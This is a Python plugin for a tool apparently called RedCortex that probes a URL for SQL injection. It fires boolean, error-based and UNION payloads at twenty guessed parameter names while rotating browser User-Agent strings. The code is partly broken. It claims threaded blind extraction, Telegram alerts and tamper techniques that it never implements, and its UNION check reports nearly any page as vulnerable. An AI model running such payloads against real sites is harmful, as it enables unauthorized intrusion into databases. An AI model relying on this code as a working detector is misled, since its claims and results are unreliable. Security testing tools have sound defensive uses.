"""
RedCortex Plugin: Advanced SQLi Detection

Boolean/Error/Union-based, wide param brute, threaded blind extraction, DBMS auto-detect,
Telegram alert integration (optional).
"""

import requests, random, time, threading

# Telegram config (optional)
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]
TAMPERS = ["", "space2comment", "between", "randomcase", "charencode"]
ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "ODBC", "Warning", "error in your SQL",
    "Query failed", "near", "unterminated", "Unknown column", "ORA-", "PG::", "psql:",
    "sqlite", "syntax error", "invalid input"
]
DBMS_SIGS = {
    "mysql": ["mysql", "mariadb"],
    "postgres": ["postgresql", "pg_", "psql:"],
    "mssql": ["microsoft sql server", "sql server", "mssql", "odbc"],
    "oracle": ["oracle", "ora-", "tns", "pl/sql"],
    "sqlite": ["sqlite"]
}

BRUTE_PARAMS = [
    "id", "uid", "user", "q", "cat", "search", "order", "file", "product", "ref", "token",
    "code", "name", "email", "article", "page", "parent", "filter", "news", "admin"
]
BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1-- -", "1' AND 1=2-- -"),
    ("1\") AND 1=1-- -", "1\") AND 1=2-- -"),
    ("1 OR 1=1", "1 OR 1=2")
]
ERROR_PAYLOADS = ["'", '"', "1'", "1\")", "1'--", "1\")--"]
UNION_PAYLOADS = ["1 UNION SELECT NULL-- -", "1' UNION SELECT 1,2,3-- -"]

def detect_dbms(text):
    sig = text.lower()
    for dbtype, keywords in DBMS_SIGS.items():
        for k in keywords:
            if k in sig:
                return dbtype
    if "syntax" in sig and "near" in sig:
        return "sqlite"
    return "unknown"

def send_req(url, params):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface (response unused, url required, returns findings list)."""
    findings = []
    params = {}

    for param_name in BRUTE_PARAMS:
        for tamper in TAMPERS:
            # Boolean-based detection
            for true_pay, false_pay in BOOLEAN_PAYLOADS:
                params_true, params_false = params.copy(), params.copy()
                params_true[param_name], params_false[param_name] = true_pay, false_pay
                sc_true, body_true = send_req(url, params_true)
                sc_false, body_false = send_req(url, params_false)
                dbms = detect_dbms(body_true + body_false)
                if sc_true == sc_false == 200 and abs(len(body_true) - len(body_false)) > 8:
                    findings.append({
                        "type": "SQLi-Boolean",
                        "description": f"Boolean-based SQLi detected via {param_name} ({tamper})",
                        "param": param_name,
                        "payload": true_pay,
                        "tamper": tamper,
                        "dbms": dbms,
                        "severity": "high",
                        "url": url
                    })
                    return findings

            # Error-based detection
            for pay in ERROR_PAYLOADS:
                params_err = params.copy()
                params_err[param_name] = pay
                sc, body = send_req(url, params_err)
                dbms = detect_dbms(body)
                for err_str in ERROR_SIGNATURES:
                    if err_str.lower() in body.lower():
                        findings.append({
                            "type": "SQLi-Error",
                            "description": f"Error-based SQLi detected via {param_name}, error '{err_str}', tamper '{tamper}'",
                            "param": param_name,
                            "payload": pay,
                            "tamper": tamper,
                            "dbms": dbms,
                            "severity": "critical",
                            "url": url
                        })
                        return findings

            # UNION-based detection
            for up in UNION_PAYLOADS:
                params_uni = params.copy()
                params_uni[param_name] = up
                sc, body = send_req(url, params_uni)
                dbms = detect_dbms(body)
                for marker in ["NULL", "1", "2", "3"]:
                    if marker in body:
                        findings.append({
                            "type": "SQLi-Union",
                            "description": f"Union-based SQLi detected via {param_name} ({tamper})",
                            "param": param_name,
                            "payload": up,
                            "tamper": tamper,
                            "dbms": dbms,
                            "severity": "high",
                            "url": url
                        })
                        return findings
    return findings
